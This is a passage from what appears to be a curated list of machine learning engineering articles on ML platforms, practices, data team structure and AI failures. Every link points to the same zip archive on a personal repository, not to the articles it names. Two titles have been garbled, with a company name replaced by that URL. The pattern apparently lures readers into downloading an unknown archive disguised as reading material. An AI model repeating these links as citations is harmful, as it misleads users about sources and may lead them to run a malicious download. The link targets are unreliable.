16. [Intelligent Automation Platform: Empowering Conversational AI and Beyond at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2022`
17. [DARWIN: Data Science and Artificial Intelligence Workbench at LinkedIn](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2022`
18. [The Magic of Merlin: Shopify's New Machine Learning Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2022`
19. [Zalando's Machine Learning Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zalando` `2022`
20. [Inside Meta's AI optimization platform for engineers across the company](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Meta` `2022`
21. [Monzo’s machine learning stack](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Monzo` `2022`
22. [Evolution of ML Fact Store](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
23. [Using MLOps to Build a Real-time End-to-End Machine Learning Pipeline](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Binance` `2022`
24. [Serving Machine Learning Models Efficiently at Scale at Zillow](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zillow` `2022`
25. [Didact AI: The anatomy of an ML-powered stock picking engine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Didact AI` `2022`
26. [Deployment for Free - A Machine Learning Platform for Stitch Fix's Data Scientists](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2022`
27. [Machine Learning Operations (MLOps): Overview, Definition, and Architecture](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `IBM` `2022`

## Practices
1. [Practical Recommendations for Gradient-Based Training of Deep Architectures](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Yoshua Bengio` `2012`
2. [Machine Learning: The High Interest Credit Card of Technical Debt](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2014`
3. [Rules of Machine Learning: Best Practices for ML Engineering](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2018`
4. [On Challenges in Machine Learning Model Management](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Amazon` `2018`
5. [Machine Learning in Production: The https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip Approach](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Booking` `2019`
6. [150 Successful Machine Learning Models: 6 Lessons Learned at https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Booking` `2019`
7. [Successes and Challenges in Adopting Machine Learning at Scale at a Global Bank](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Rabobank` `2019`
8. [Challenges in Deploying Machine Learning: a Survey of Case Studies](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Cambridge` `2020`
9. [Reengineering Facebook AI’s Deep Learning Platforms for Interoperability](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
10. [The problem with AI developer tools for enterprises](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Databricks` `2020`
11. [Continuous Integration and Deployment for Machine Learning Online Serving and Models](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2021`
12. [Tuning Model Performance](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2021`
13. [Maintaining Machine Learning Model Accuracy Through Monitoring](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
14. [Building Scalable and Performant Marketing ML Systems at Wayfair](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Wayfair` `2021`
15. [Our approach to building transparent and explainable AI systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2021`
16. [5 Steps for Building Machine Learning Models for Business](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2021`
17. [Data Is An Art, Not Just A Science—And Storytelling Is The Key](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2022`
18. [Best Practices for Real-time Machine Learning: Alerting](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2022`
19. [Automatic Retraining for Machine Learning Models: Tips and Lessons Learned](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2022`
20. [RecSysOps: Best Practices for Operating a Large-Scale Recommender System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
21. [ML Education at Uber: Frameworks Inspired by Engineering Principles](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2022`
22. [Building and Maintaining Internal Tools for DS/ML teams: Lessons Learned](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2024`

## Team structure
1. [What is the most effective way to structure a data science team?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Udemy` `2017`
1. [Engineers Shouldn’t Write ETL: A Guide to Building a High Functioning Data Science Department](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2016`
2. [Building The Analytics Team At Wish](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Wish` `2018`
3. [Beware the Data Science Pin Factory: The Power of the Full-Stack Data Science Generalist](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2019`
4. [Cultivating Algorithms: How We Grow Data Science at Stitch Fix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix`
5. [Analytics at Netflix: Who We Are and What We Do](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
6. [Building a Data Team at a Mid-stage Startup: A Short Story](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Erikbern` `2021`
7. [A Behind-the-Scenes Look at How Postman’s Data Team Works](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Postman` `2021`
8. [Data Scientist x Machine Learning Engineer Roles: How are they different? How are they alike?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2022`

## Fails
1. [When It Comes to Gorillas, Google Photos Remains Blind](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2018`
2. [160k+ High School Students Will Graduate Only If a Model Allows Them to](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `International Baccalaureate` `2020`
3. [An Algorithm That ‘Predicts’ Criminality Based on a Face Sparks a Furor](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Harrisburg University` `2020`
4. [It's Hard to Generate Neural Text From GPT-3 About Muslims](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `OpenAI` `2020`
5. [A British AI Tool to Predict Violent Crime Is Too Flawed to Use](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `United Kingdom` `2020`
6. More in [awful-ai](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)
7. [AI Incident Database](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Partnership on AI` `2022`

<br>

**P.S., Want a summary of ML advancements?** Get up to speed with survey papers 👉[`ml-surveys`](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)
